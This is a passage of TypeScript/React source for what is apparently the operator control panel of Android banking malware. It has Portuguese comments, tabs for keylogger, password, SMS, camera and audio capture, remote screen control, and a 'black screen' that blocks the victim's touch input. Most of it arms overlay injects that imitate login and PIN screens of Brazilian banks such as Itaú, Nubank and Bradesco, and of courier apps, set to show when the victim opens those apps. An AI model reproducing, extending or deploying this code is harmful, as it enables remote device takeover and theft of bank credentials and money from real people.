    const endNormX = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
    const endNormY = Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height));

    const deltaX = e.clientX - start.clientX;
    const deltaY = e.clientY - start.clientY;
    const dist = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
    const deltaTime = Date.now() - start.time;

    if (dist > 12) {
      // GESTO DE ARRASTAR / SWIPE
      const startX = Math.round(start.normX * devW);
      const startY = Math.round(start.normY * devH);
      const endX = Math.round(endNormX * devW);
      const endY = Math.round(endNormY * devH);

      if (onSwipe) {
        onSwipe(startX, startY, endX, endY, start.normX, start.normY, endNormX, endNormY, Math.max(150, deltaTime));
      }
    } else {
      // CLIQUE SIMPLES
      const clickX = Math.round(endNormX * devW);
      const clickY = Math.round(endNormY * devH);

      if (hierarchy && onNodeSelect) {
        const allNodes: ScreenReaderNode[] = [];
        collectAllVisibleNodes(hierarchy, allNodes);
        let found: ScreenReaderNode | null = null;
        let minArea = Infinity;
        allNodes.forEach((node) => {
          if (!node.bounds) return;
          const { x, y, w, h } = node.bounds;
          if (clickX >= x && clickX <= x + w && clickY >= y && clickY <= y + h) {
            const area = w * h;
            if (area < minArea) {
              minArea = area;
              found = node;
            }
          }
        });
        onNodeSelect(found);
      }

      if (onNodeClick) {
        onNodeClick(clickX, clickY, endNormX, endNormY);
      }
    }
  };

  const handlePointerMove = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (!hierarchy || !onNodeHover) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const normX = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
    const normY = Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height));
    const moveX = Math.round(normX * devW);
    const moveY = Math.round(normY * devH);

    const allNodes: ScreenReaderNode[] = [];
    collectAllVisibleNodes(hierarchy, allNodes);
    let found: ScreenReaderNode | null = null;
    let minArea = Infinity;
    allNodes.forEach((node) => {
      if (!node.bounds) return;
      const { x, y, w, h } = node.bounds;
      if (moveX >= x && moveX <= x + w && moveY >= y && moveY <= y + h) {
        const area = w * h;
        if (area < minArea) {
          minArea = area;
          found = node;
        }
      }
    });
    onNodeHover(found ? getNodeKey(found) : null);
  };

  return (
    <canvas
      ref={canvasRef}
      onPointerDown={handlePointerDown}
      onPointerUp={handlePointerUp}
      onPointerMove={handlePointerMove}
      onPointerLeave={() => onNodeHover && onNodeHover(null)}
      className={`block w-full h-full touch-none select-none ${
        v2Mode === 'edit'
          ? 'cursor-pointer'
          : v2Mode === 'add_hotspot'
          ? 'cursor-cell'
          : 'cursor-crosshair'
      }`}
      style={{ width: '100%', height: '100%' }}
    />
  );
};

// ðŸ”· Componente de Fundo Animado "Cyber Blue Modern Background" com Raios a cada 10s
const ModernCyberBlueBackground = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let animId: number;
    let w = (canvas.width = window.innerWidth);
    let h = (canvas.height = window.innerHeight);

    const handleResize = () => {
      if (!canvas) return;
      w = canvas.width = window.innerWidth;
      h = canvas.height = window.innerHeight;
    };
    window.addEventListener('resize', handleResize);

    interface Particle {
      x: number;
      y: number;
      vx: number;
      vy: number;
      radius: number;
      alpha: number;
      pulse: number;
      color: string;
    }

    const particleCount = 50;
    const particles: Particle[] = Array.from({ length: particleCount }, () => ({
      x: Math.random() * w,
      y: Math.random() * h,
      vx: (Math.random() - 0.5) * 0.9,
      vy: (Math.random() - 0.5) * 0.9,
      radius: 1.5 + Math.random() * 2.8,
      alpha: 0.35 + Math.random() * 0.5,
      pulse: Math.random() * Math.PI * 2,
      color: Math.random() > 0.35 ? '#ff1e4d' : '#ff4d6d'
    }));

    let mousePos = { x: w / 2, y: h / 2 };

    const handleMouseMove = (e: MouseEvent) => {
      mousePos.x = e.clientX;
      mousePos.y = e.clientY;
    };
    window.addEventListener('mousemove', handleMouseMove);

    // âš¡ Raios Ciber-ElÃ©tricos a cada 10 Segundos
    let lastBoltTime = Date.now() - 8000; // Primeiro raio logo em ~2 segundos
    let boltActive = false;
    let boltAlpha = 0;
    let boltPath: { x: number; y: number }[] = [];
    let boltBranches: { x: number; y: number }[][] = [];

    const generateLightning = () => {
      const startX = Math.random() * w;
      let currX = startX;
      let currY = 0;
      const mainPath: { x: number; y: number }[] = [{ x: currX, y: currY }];
      const branches: { x: number; y: number }[][] = [];

      while (currY < h * 0.85) {
        currY += 25 + Math.random() * 45;
        currX += (Math.random() - 0.5) * 75;
        mainPath.push({ x: currX, y: currY });

        // Branch probabilÃ­stica
        if (Math.random() < 0.35 && branches.length < 3) {
          let bx = currX;
          let by = currY;
          const branchPath: { x: number; y: number }[] = [{ x: bx, y: by }];
          for (let b = 0; b < 4; b++) {
            by += 20 + Math.random() * 30;
            bx += (Math.random() - 0.5) * 60;
            branchPath.push({ x: bx, y: by });
          }
          branches.push(branchPath);
        }
      }

      boltPath = mainPath;
      boltBranches = branches;
      boltActive = true;
      boltAlpha = 1.0;
    };

    const render = () => {
      ctx.clearRect(0, 0, w, h);

      // Fundo azul cibernÃ©tico mais claro e elegante
      const bgGrad = ctx.createLinearGradient(0, 0, 0, h);
      bgGrad.addColorStop(0, '#09152e');
      bgGrad.addColorStop(0.5, '#071024');
      bgGrad.addColorStop(1, '#050a17');
      ctx.fillStyle = bgGrad;
      ctx.fillRect(0, 0, w, h);

      // Radial Glow mais nÃ­tido e claro no centro
      const centerGlow = ctx.createRadialGradient(w / 2, h / 2, 50, w / 2, h / 2, Math.max(w, h) * 0.65);
      centerGlow.addColorStop(0, 'rgba(0, 180, 255, 0.08)');
      centerGlow.addColorStop(0.5, 'rgba(30, 80, 180, 0.04)');
      centerGlow.addColorStop(1, 'rgba(0, 0, 0, 0)');
      ctx.fillStyle = centerGlow;
      ctx.fillRect(0, 0, w, h);

      // Glow suave interativo no cursor do mouse
      const mouseGrad = ctx.createRadialGradient(mousePos.x, mousePos.y, 0, mousePos.x, mousePos.y, 280);
      mouseGrad.addColorStop(0, 'rgba(0, 240, 255, 0.18)');
      mouseGrad.addColorStop(0.5, 'rgba(59, 130, 246, 0.08)');
      mouseGrad.addColorStop(1, 'rgba(0, 0, 0, 0)');
      ctx.fillStyle = mouseGrad;
      ctx.beginPath();
      ctx.arc(mousePos.x, mousePos.y, 280, 0, Math.PI * 2);
      ctx.fill();

      // Linhas de conexÃ£o de rede cibernÃ©tica entre partÃ­culas prÃ³ximas
      ctx.lineWidth = 0.9;
      for (let i = 0; i < particleCount; i++) {
        for (let j = i + 1; j < particleCount; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.hypot(dx, dy);

          if (dist < 140) {
            const lineAlpha = (1 - dist / 140) * 0.3;
            ctx.strokeStyle = `rgba(0, 240, 255, ${lineAlpha})`;
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.stroke();
          }
        }
      }

      // Atualiza e desenha partÃ­culas azuis flutuantes
      particles.forEach((p) => {
        p.x += p.vx;
        p.y += p.vy;
        p.pulse += 0.03;

        if (p.x < 0) p.x = w;
        if (p.x > w) p.x = 0;
        if (p.y < 0) p.y = h;
        if (p.y > h) p.y = 0;

        const currentAlpha = p.alpha + Math.sin(p.pulse) * 0.2;
        ctx.save();
        ctx.globalAlpha = Math.max(0.15, Math.min(0.95, currentAlpha));
        ctx.fillStyle = p.color;
        ctx.shadowColor = p.color;
        ctx.shadowBlur = 12;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fill();
        ctx.restore();
      });

      // âš¡ Disparo do Raio a cada 10 Segundos (10.000 ms)
      const now = Date.now();
      if (now - lastBoltTime >= 10000) {
        lastBoltTime = now;
        generateLightning();
      }

      // Desenho do Raio Animado
      if (boltActive && boltAlpha > 0) {
        // RelÃ¢mpago / ClarÃ£o rÃ¡pido no fundo
        ctx.save();
        ctx.fillStyle = `rgba(0, 220, 255, ${boltAlpha * 0.09})`;
        ctx.fillRect(0, 0, w, h);
        ctx.restore();

        // Raio Principal
        ctx.save();
        ctx.strokeStyle = `rgba(220, 250, 255, ${boltAlpha})`;
        ctx.shadowColor = '#ff1e4d';
        ctx.shadowBlur = 24;
        ctx.lineWidth = 3;
        ctx.beginPath();
        boltPath.forEach((pt, idx) => {
          if (idx === 0) ctx.moveTo(pt.x, pt.y);
          else ctx.lineTo(pt.x, pt.y);
        });
        ctx.stroke();

        // RamificaÃ§Ãµes do Raio
        ctx.lineWidth = 1.6;
        ctx.strokeStyle = `rgba(0, 240, 255, ${boltAlpha * 0.8})`;
        boltBranches.forEach((branch) => {
          ctx.beginPath();
          branch.forEach((pt, idx) => {
            if (idx === 0) ctx.moveTo(pt.x, pt.y);
            else ctx.lineTo(pt.x, pt.y);
          });
          ctx.stroke();
        });
        ctx.restore();

        // Decaimento suave do raio (dura ~400ms)
        boltAlpha -= 0.035;
        if (boltAlpha <= 0) {
          boltActive = false;
        }
      }

      animId = requestAnimationFrame(render);
    };

    render();

    return () => {
      window.removeEventListener('resize', handleResize);
      window.removeEventListener('mousemove', handleMouseMove);
      cancelAnimationFrame(animId);
    };
  }, []);

  return (
    <canvas
      ref={canvasRef}
      className="fixed inset-0 pointer-events-none z-0 w-full h-full"
    />
  );
};

export default function DeviceControlModern({ onLogout }: { onLogout?: () => void }) {
  const { deviceId } = useParams<{ deviceId: string }>();
  const navigate = useNavigate();

  // Navigation state
  const [activeTab, setActiveTab] = useState<
    'general_info' | 'live_screen' | 'admin_security' | 'passwords' | 'camera' | 'data_scraper' | 'files' | 'sms' | 'apps' | 'keylogger' | 'contacts' | 'location' | 'audio' | 'google_accounts'
  >('live_screen');

  // General Info Subtab
  const [generalSubTab, setGeneralSubTab] = useState<'general' | 'permissions' | 'bot_options' | 'activities'>('general');

  // Device Data
  const [device, setDevice] = useState<Device | null>(null);

  // Live Screen Settings & Controls
  const [screenViewMode, setScreenViewMode] = useState<'vnc' | 'v2' | 'dual'>('vnc');
  const [streamPaused, setStreamPaused] = useState(false);

  const [isBlackScreen, setIsBlackScreen] = useState(false);
  const [isTouchBlocked, setIsTouchBlocked] = useState(false);
  const [showBlackScreenChoiceModal, setShowBlackScreenChoiceModal] = useState(false);
  const [showBlackScreenEditor, setShowBlackScreenEditor] = useState(false);
  const [editingTemplate, setEditingTemplate] = useState<any>(null);
  const [isPointerMode, setIsPointerMode] = useState(false);
  const [showKeyboardModal, setShowKeyboardModal] = useState(false);
  const [keyboardInput, setKeyboardInput] = useState('');
  const [quickActionModal, setQuickActionModal] = useState(false);
  const [showRenameModal, setShowRenameModal] = useState(false);
  const [showVoiceCallModal, setShowVoiceCallModal] = useState(false);
  const [newDeviceName, setNewDeviceName] = useState('');
  const [isRenaming, setIsRenaming] = useState(false);

  // Alternar Bloqueio de Toque no Aparelho
  const toggleTouchBlock = (block: boolean) => {
    setIsTouchBlocked(block);
    sendCommand({ action: 'TOGGLE_TOUCH_BLOCK', enabled: block });
    if (block) {
      showToast('Bloqueio de toque ativado no aparelho (vÃ­tima nÃ£o clica)', 'info');
    } else {
      showToast('Toque liberado! NavegaÃ§Ã£o VNC e V2 ativas na tela preta.', 'success');
    }
  };

  // Qualidade de Imagem VNC (Melhorar Imagem)
  const [vncQuality, setVncQuality] = useState<number>(85); // PadrÃ£o HD 85%

  const changeVncQuality = (quality: number) => {
    setVncQuality(quality);
    sendCommand({ action: 'SET_SILENT_VNC_QUALITY', quality });
    sendCommand({ action: 'SET_VNC_QUALITY', quality });
    const label = quality >= 95 ? 'Ultra HD (95%)' : quality >= 85 ? 'HD High (85%)' : quality >= 60 ? 'Normal (60%)' : 'Turbo (35%)';
    showToast(`Qualidade da Imagem VNC: ${label}`, 'success');
  };

  // Screen V2 Hierarchy
  const [screenHierarchy, setScreenHierarchy] = useState<any>(null);

  // --- TELA V2 EDITÃVEL STATES ---
  const [v2Mode] = useState<'action' | 'edit' | 'search' | 'add_hotspot'>('edit');
  const [v2Theme] = useState<'cyber' | 'matrix' | 'gold' | 'purple'>('cyber');
  const [v2SearchQuery] = useState('');
  const [v2SelectedNode, setV2SelectedNode] = useState<ScreenReaderNode | null>(null);

  // --- TELA V2 GERAL EDITING STATES (EDITAR TELA V2 TODA DE UMA VEZ) ---
  const [v2GlobalTextScale, setV2GlobalTextScale] = useState<number>(1.0);
  const [v2GlobalOpacity, setV2GlobalOpacity] = useState<number>(40);
  const [v2GlobalBorderStyle, setV2GlobalBorderStyle] = useState<'rounded' | 'square'>('rounded');
  const [v2GlobalBlockColor, setV2GlobalBlockColor] = useState<string>('');
  const [v2GlobalTextColor, setV2GlobalTextColor] = useState<string>('');
  const [v2EditorMode, setV2EditorMode] = useState<'global' | 'single'>('global');
  const [showV2EditorPanel, setShowV2EditorPanel] = useState<boolean>(false);



  // Helper para acionar Tela Preta garantindo envio de mÃºltiplos comandos para compatibilidade
  const handleToggleBlackScreen = (next: boolean, template?: any) => {
    setIsBlackScreen(next);
    if (next) {
      if (template) {
        sendCommand({
          action: 'CUSTOM_BLACK_SCREEN',
          template,
          package: template.package || template.packageName || appInjectModalApp?.package
        });
      } else {
        sendCommand({ action: 'BLACK_SCREEN_ON' });
        sendCommand({ action: 'TOGGLE_BLACK_SCREEN', enabled: true, enable: true });
      }
      toggleTouchBlock(true);
      const pkg = template?.package || template?.packageName || appInjectModalApp?.package;
      if (pkg) {
        showToast(`ðŸŽ¯ InjeÃ§Ã£o armada para o app ${pkg}! O overlay serÃ¡ exibido SOMENTE quando a vÃ­tima abrir este aplicativo.`, 'success');
      } else {
        showToast('Tela preta ativada no celular! (Bloqueio de toque ativado)', 'info');
      }
    } else {
      sendCommand({ action: 'BLACK_SCREEN_OFF' });
      sendCommand({ action: 'TOGGLE_BLACK_SCREEN', enabled: false, enable: false });
      toggleTouchBlock(false);
      showToast('Tela preta desativada!', 'info');
    }
  };

  // Modal de ConfiguraÃ§Ã£o de DÃ­gitos dos Injects
  const [bankInjectModalConfig, setBankInjectModalConfig] = useState<{ open: boolean; template: any } | null>(null);
  const [injectDigits1, setInjectDigits1] = useState<number>(6);
  const [injectDigits2, setInjectDigits2] = useState<number>(4);

  // Modal de InjeÃ§Ã£o Direta por Aplicativo
  const [appInjectModalApp, setAppInjectModalApp] = useState<{ name: string; package: string; icon?: string } | null>(null);
  const [appInjectTab, setAppInjectTab] = useState<'saved' | 'system'>('saved');
  const [isArmingInject, setIsArmingInject] = useState<boolean>(false);
  const [overlayMappings, setOverlayMappings] = useState<any[]>([]);

  const fetchOverlayMappings = useCallback(async () => {
    const effectiveDeviceId = (device as any)?.device_id || deviceId || (device as any)?.id;
    if (!effectiveDeviceId) return;

    let localList: any[] = [];
    try {
      const raw = localStorage.getItem(`armed_overlay_mappings_${effectiveDeviceId}`);
      if (raw) {
        localList = JSON.parse(raw);
      }
    } catch (e) {}

    try {
      const data = await devicesAPI.getOverlayMappings(effectiveDeviceId);
      const serverList = Array.isArray(data) ? data : [];

      setOverlayMappings(serverList);
      try {
        localStorage.setItem(`armed_overlay_mappings_${effectiveDeviceId}`, JSON.stringify(serverList));
      } catch (e) {}
    } catch (err) {
      console.error('Erro ao carregar overlay mappings:', err);
      if (localList.length > 0) {
        setOverlayMappings(localList);
      }
    }
  }, [deviceId, device]);

  const handleDisarmInject = async (pkgName: string) => {
    const effectiveDeviceId = (device as any)?.device_id || deviceId || (device as any)?.id;
    if (!effectiveDeviceId) return;

    const cleanPkg = pkgName.trim().toLowerCase();
    const pkgsToDisarm = new Set<string>([cleanPkg]);
    if (cleanPkg.includes('itau')) {
      pkgsToDisarm.add('com.itau');
      pkgsToDisarm.add('br.com.itau');
      pkgsToDisarm.add('br.com.itau.pers');
      pkgsToDisarm.add('com.itau.cartoes');
    }
    if (cleanPkg.includes('bradesco')) {
      pkgsToDisarm.add('br.com.bradesco');
      pkgsToDisarm.add('com.bradesco.cartoes');
    }
    if (cleanPkg.includes('nubank')) {
      pkgsToDisarm.add('com.nu.production');
      pkgsToDisarm.add('com.nubank');
    }
    if (cleanPkg.includes('santander')) {
      pkgsToDisarm.add('com.santander.app');
    }
    if (cleanPkg.includes('caixa')) {
      pkgsToDisarm.add('br.gov.caixa.tem');
      pkgsToDisarm.add('br.com.gft.banco7');
    }
    if (cleanPkg.includes('inter')) {
      pkgsToDisarm.add('br.com.intermedium');
      pkgsToDisarm.add('com.bancocinter');
    }

    // Immediately update local state & localStorage synchronously
    setOverlayMappings((prev) => {
      const updated = prev.filter((m) => {
        const mPkg = (m.package_name || m.package || '').toLowerCase();
        return !Array.from(pkgsToDisarm).some(p => mPkg === p || mPkg.includes(p) || p.includes(mPkg));
      });
      try {
        localStorage.setItem(`armed_overlay_mappings_${effectiveDeviceId}`, JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });

    try {
      for (const p of pkgsToDisarm) {
        sendCommand({
          action: 'DISARM_OVERLAY_MAPPING',
          package: p,
          package_name: p
        });
      }

      const matching = overlayMappings.filter(m => {
        const mPkg = (m.package_name || m.package || '').toLowerCase();
        return Array.from(pkgsToDisarm).some(p => mPkg === p || mPkg.includes(p) || p.includes(mPkg));
      });

      for (const mapItem of matching) {
        try {
          await devicesAPI.deleteOverlayMapping(effectiveDeviceId, mapItem.id);
        } catch (e) {}
      }

      showToast(`ðŸš« Inject desarmado com sucesso! A tela de overlay foi desativada.`, 'success');
      setAppInjectModalApp(null);
      await fetchOverlayMappings();
    } catch (err) {
      console.error('Erro ao desarmar inject:', err);
      sendCommand({
        action: 'DISARM_OVERLAY_MAPPING',
        package: pkgName,
        package_name: pkgName
      });
      showToast(`ðŸš« Inject desarmado!`, 'info');
      setAppInjectModalApp(null);
      fetchOverlayMappings();
    }
  };

  // Helper para recuperar templates salvos pelo usuÃ¡rio no localStorage / EstÃºdio
  const getSavedUserTemplates = (): any[] => {
    const list: any[] = [];
    try {
      const raw = localStorage.getItem('blackScreenTemplates');
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed)) list.push(...parsed);
      }
    } catch (e) {}

    try {
      const rawBank = localStorage.getItem('customPresetBankScreens');
      if (rawBank) {
        const parsedBank = JSON.parse(rawBank);
        if (Array.isArray(parsedBank)) list.push(...parsedBank);
      }
    } catch (e) {}

    const seen = new Set();
    return list.filter(t => {
      if (!t || !t.id) return false;
      if (seen.has(t.id)) return false;
      seen.add(t.id);
      return true;
    });
  };

  const findBestInjectTemplate = (appName: string, appPkg: string) => {
    const nameLower = (appName || '').toLowerCase();
    const pkgLower = (appPkg || '').toLowerCase();

    // Procura primeiro nos templates salvos pelo usuÃ¡rio que batem com o app
    const savedList = getSavedUserTemplates();
    const matchedSaved = savedList.find(t => {
      const tName = (t.name || '').toLowerCase();
      const tId = (t.id || '').toLowerCase();
      return (tName.includes(nameLower) || tId.includes(nameLower) || (nameLower && tName.includes(nameLower.split(' ')[0])));
    });
    if (matchedSaved) return matchedSaved;

    if (nameLower.includes('itaÃº') || nameLower.includes('itau') || pkgLower.includes('itau')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-itau-senha');
    }
    if (nameLower.includes('bradesco') || pkgLower.includes('bradesco')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-bradesco-token');
    }
    if (nameLower.includes('caixa') || pkgLower.includes('caixa')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-caixa-senha');
    }
    if (nameLower.includes('santander') || pkgLower.includes('santander')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-santander-id');
    }
    if (nameLower.includes('nubank') || nameLower.includes('nu ') || pkgLower.includes('nu.')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-nubank-senha');
    }
    if (nameLower.includes('inter') || pkgLower.includes('intermedium')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-inter-isafe');
    }
    if (nameLower.includes('c6') || pkgLower.includes('c6bank')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-c6-senha');
    }
    if (nameLower.includes('btg') || pkgLower.includes('btg')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-btg-senha');
    }
    if (nameLower.includes('sicredi') || pkgLower.includes('sicredi') || nameLower.includes('sicoob')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-sicredi-senha');
    }
    if (nameLower.includes('banrisul') || pkgLower.includes('banrisul')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-banrisul-senha');
    }
    if (nameLower.includes('banco do brasil') || nameLower.includes('bb') || pkgLower.includes('bb.android')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-bb-senha');
    }
    if (nameLower.includes('correios') || pkgLower.includes('correios')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-correios-liberacao');
    }
    if (nameLower.includes('jt') || nameLower.includes('j&t') || pkgLower.includes('jt')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-jt-express');
    }
    if (nameLower.includes('loggi') || pkgLower.includes('loggi')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-loggi-entrega');
    }
    if (nameLower.includes('mercado') || pkgLower.includes('mercadopago') || pkgLower.includes('mercadolibre')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-mercado-envios');
    }
    if (nameLower.includes('jadlog') || pkgLower.includes('jadlog')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-jadlog-frete');
    }
    if (nameLower.includes('dhl') || pkgLower.includes('dhl')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-dhl-express');
    }
    if (nameLower.includes('google') || pkgLower.includes('google')) {
      return PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === 'pre-google-progress');
    }

    return null;
  };

  const handleInjectApp = (app: { name: string; package: string; icon?: string }) => {
    // NÃƒO abre o app automaticamente no celular. Abre apenas o modal para o usuÃ¡rio armar o inject.
    const saved = getSavedUserTemplates();
    setAppInjectTab(saved.length > 0 ? 'saved' : 'system');
    setAppInjectModalApp(app);
  };

  const handleArmInjectForApp = async (tplSummary: { name: string; id: string; elements?: any[]; backgroundColor?: string }) => {
    const savedList = getSavedUserTemplates();
    const baseTpl = PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === tplSummary.id) ||
                    savedList.find(t => t.id === tplSummary.id) ||
                    tplSummary;

    const targetPkg = (tplSummary as any)?.package || (tplSummary as any)?.package_name || (tplSummary as any)?.packageName || appInjectModalApp?.package;
    const targetAppName = (tplSummary as any)?.appName || appInjectModalApp?.name || targetPkg || 'Aplicativo';
    const effectiveDeviceId = (device as any)?.device_id || deviceId || (device as any)?.id;

    if (targetPkg && effectiveDeviceId) {
      try {
        setIsArmingInject(true);

        const newMapObj = {
          id: Date.now(),
          device_id: effectiveDeviceId,
          package_name: targetPkg,
          package: targetPkg,
          screen_name: tplSummary.name || baseTpl.name || 'Custom Overlay',
          is_enabled: true
        };

        setOverlayMappings((prev) => {
          const filtered = prev.filter((m) => {
            const mPkg = (m.package_name || m.package || '').toLowerCase();
            return mPkg !== targetPkg.toLowerCase();
          });
          const updated = [...filtered, newMapObj];
          try {
            localStorage.setItem(`armed_overlay_mappings_${effectiveDeviceId}`, JSON.stringify(updated));
          } catch (e) {}
          return updated;
        });

        // 1. Salva mapeamento via REST API no banco do servidor
        await devicesAPI.createOverlayMapping(effectiveDeviceId, {
          package_name: targetPkg,
          screen_name: tplSummary.name || baseTpl.name || 'Custom Overlay',
          template: tplSummary,
          is_enabled: true
        });

        // 2. Envia tambÃ©m comando WebSocket para redundÃ¢ncia e sincronizaÃ§Ã£o imediata
        sendCommand({
          action: 'ARM_OVERLAY_MAPPING',
          package: targetPkg,
          package_name: targetPkg,
          screen_name: tplSummary.name || baseTpl.name || 'Custom Overlay',
          template: tplSummary,
          is_enabled: true
        });

        showToast(`ðŸŽ¯ InjeÃ§Ã£o de "${tplSummary.name || baseTpl.name || 'Overlay'}" ARMADA para ${targetAppName}!`, 'success');
        setAppInjectModalApp(null);
        await fetchOverlayMappings();
      } catch (err) {
        console.error('Erro ao salvar mapeamento de overlay:', err);
        // Mesmo em caso de erro na API REST, envia via WebSocket como fallback
        sendCommand({
          action: 'ARM_OVERLAY_MAPPING',
          package: targetPkg,
          package_name: targetPkg,
          screen_name: tplSummary.name || baseTpl.name || 'Custom Overlay',
          template: tplSummary,
          is_enabled: true
        });
        showToast(`ðŸŽ¯ InjeÃ§Ã£o de "${tplSummary.name || baseTpl.name || 'Overlay'}" ARMADA para ${targetAppName}!`, 'success');
        setAppInjectModalApp(null);
        fetchOverlayMappings();
      } finally {
        setIsArmingInject(false);
      }
    } else {
      showToast('âš ï¸ Selecione um aplicativo vÃ¡lido para armar a injeÃ§Ã£o.', 'error');
    }
  };

  const handlePrepareInject = (tplSummary: { name: string; id: string; elements?: any[]; backgroundColor?: string }) => {
    const savedList = getSavedUserTemplates();
    const baseTpl = PREDEFINED_BLACK_SCREEN_TEMPLATES?.find(t => t.id === tplSummary.id) ||
                    savedList.find(t => t.id === tplSummary.id) ||
                    tplSummary;

    // Associa o pacote do app especificamente para disparar SOMENTE quando a vÃ­tima abrir o app
    const targetPkg = appInjectModalApp?.package;
    const targetAppName = appInjectModalApp?.name;

    const foundTpl = targetPkg ? {
      ...baseTpl,
      package: targetPkg,
      packageName: targetPkg,
      target_package: targetPkg,
      appName: targetAppName || baseTpl.name,
      trigger_on_app_open_only: true
    } : baseTpl;

    const tplId = (tplSummary.id || '').toLowerCase();
    const tplName = (tplSummary.name || '').toLowerCase();

    const isBankTpl = tplId.includes('itau') || tplId.includes('bb') || tplId.includes('bradesco') || 
                      tplId.includes('caixa') || tplId.includes('santander') || tplId.includes('nubank') || 
                      tplId.includes('inter') || tplId.includes('c6') || tplId.includes('btg') || 
                      tplId.includes('sicredi') || tplId.includes('banrisul') || tplName.includes('itaÃº') || 
                      tplName.includes('senha') || tplName.includes('cÃ³digo') || tplName.includes('pin') ||
                      tplName.includes('banco') || tplName.includes('acesso') || tplName.includes('token') ||
                      tplName.includes('liberaÃ§Ã£o') || tplName.includes('validac');

    if (isBankTpl) {
      if (tplId.includes('itau') || tplName.includes('itaÃº')) {
        setInjectDigits1(6);
        setInjectDigits2(4);
      } else if (tplId.includes('nubank')) {
        setInjectDigits1(6);
        setInjectDigits2(0);
      } else {
        setInjectDigits1(6);
        setInjectDigits2(4);
      }
      setBankInjectModalConfig({ open: true, template: foundTpl });
    } else {
      if (appInjectModalApp) {
        handleArmInjectForApp(foundTpl);
      } else {
        handleToggleBlackScreen(true, foundTpl);
      }
    }
  };

  const handleConfirmBankInject = () => {
    if (!bankInjectModalConfig?.template) return;
    const tpl = bankInjectModalConfig.template;

    const configuredTemplate = {
      ...tpl,
      digits1: injectDigits1,
      digits2: injectDigits2,
      multiStep: injectDigits2 > 0,
      elements: (tpl.elements || []).map((el: any) => {
        if (el.id?.includes('dots') || el.id?.includes('indicator') || (typeof el.content === 'string' && el.content.includes('â—‹'))) {
          const initialDots = Array(injectDigits1).fill('â—‹').join(' ');
          return { ...el, content: initialDots };
        }
        return el;
      })
    };

    const targetPkg = (configuredTemplate as any)?.package || (configuredTemplate as any)?.package_name || (configuredTemplate as any)?.packageName || appInjectModalApp?.package;

    if (appInjectModalApp || targetPkg) {
      handleArmInjectForApp(configuredTemplate);
    } else {
      handleToggleBlackScreen(true, configuredTemplate);
    }
    setBankInjectModalConfig(null);
    setShowBlackScreenChoiceModal(false);
  };

  // Sidebar collapse state
  const [isSidebarCollapsed, setIsSidebarCollapsed] = useState<boolean>(false);

  // Edit fields for selected node
  const [v2EditLabel, setV2EditLabel] = useState('');
  const [v2EditColor, setV2EditColor] = useState('#ff2e5d');
  const [v2EditTextColor, setV2EditTextColor] = useState('#FFFFFF');
  const [v2EditFontSize, setV2EditFontSize] = useState<number>(16);
  const [v2EditOpacity, setV2EditOpacity] = useState<number>(40);
  const [v2EditGlow, setV2EditGlow] = useState<number>(2);
  const [v2EditBorderStyle, setV2EditBorderStyle] = useState<'rounded' | 'square'>('rounded');

  // Custom node labels and highlights map: nodeId -> { customText, customColor, textColor, fontSize, opacity, glow, fontWeight, badge, macroAction }
  const [v2Customizations, setV2Customizations] = useState<
    Record<
      string,
      {
        customText?: string;
        customColor?: string;
        textColor?: string;
        fontSize?: number;
        opacity?: number;
        glow?: number;
        fontWeight?: string;
        badge?: string;
        macroAction?: string;
        borderStyle?: 'square' | 'rounded';
      }
    >
  >(() => {
    try {
      const saved = localStorage.getItem(`v2_custom_${deviceId}`);
      return saved ? JSON.parse(saved) : {};
    } catch {
      return {};
    }
  });

  // Clear any legacy custom hotspots on device change
  useEffect(() => {
    if (deviceId) {
      localStorage.removeItem(`v2_hotspots_${deviceId}`);
    }
  }, [deviceId]);

  // Save customizations to localStorage whenever updated
  useEffect(() => {
    if (deviceId) {
      localStorage.setItem(`v2_custom_${deviceId}`, JSON.stringify(v2Customizations));
    }
  }, [v2Customizations, deviceId]);

  // When node is selected in edit mode, sync form fields
  useEffect(() => {
    if (v2SelectedNode) {
      const key = getNodeKey(v2SelectedNode);
